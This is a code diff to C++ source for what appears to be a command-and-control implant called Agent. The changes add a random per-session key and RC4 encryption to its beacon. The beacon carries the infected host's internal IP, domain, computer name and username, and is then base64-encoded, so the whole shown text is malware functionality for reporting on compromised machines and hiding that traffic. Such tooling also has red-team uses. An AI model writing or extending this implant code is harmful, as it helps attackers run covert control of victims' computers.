@@ -3,6 +3,7 @@
 #include "utils.h"
 #include "Packer.h"
 #include "Encoders.h"
+#include "Crypt.h"
 
 Agent::Agent()
 {
@@ -23,6 +24,10 @@ Agent::Agent()
 
 	memorysaver  = (MemorySaver*)MemAllocLocal(sizeof(MemorySaver));
 	*memorysaver = MemorySaver();
+
+	SessionKey = (PBYTE) MemAllocLocal(16);
+	for (int i = 0; i < 16; i++)
+		SessionKey[i] = GenerateRandom32() % 0x100;
 
 	this->config->active = true;
 }
@@ -65,7 +70,7 @@ LPSTR Agent::BuildBeat()
 	packer->Pack8(this->info->minor_version);
 	packer->Pack32(this->info->internal_ip);
 	packer->Pack8( flag );
-	packer->PackBytes(this->config->session_key, 16);
+	packer->PackBytes(this->SessionKey, 16);
 	packer->PackStringA(this->info->domain_name);
 	packer->PackStringA(this->info->computer_name);
 	packer->PackStringA(this->info->username);
@@ -73,6 +78,8 @@ LPSTR Agent::BuildBeat()
 
 	PBYTE beat = packer->GetData();
 	ULONG beat_size = packer->GetDataSize();
+
+	EncryptRC4(beat, beat_size, this->config->encrypt_key, 16);
 
 	LPSTR encoded_beat = b64_encode(beat, beat_size);
 
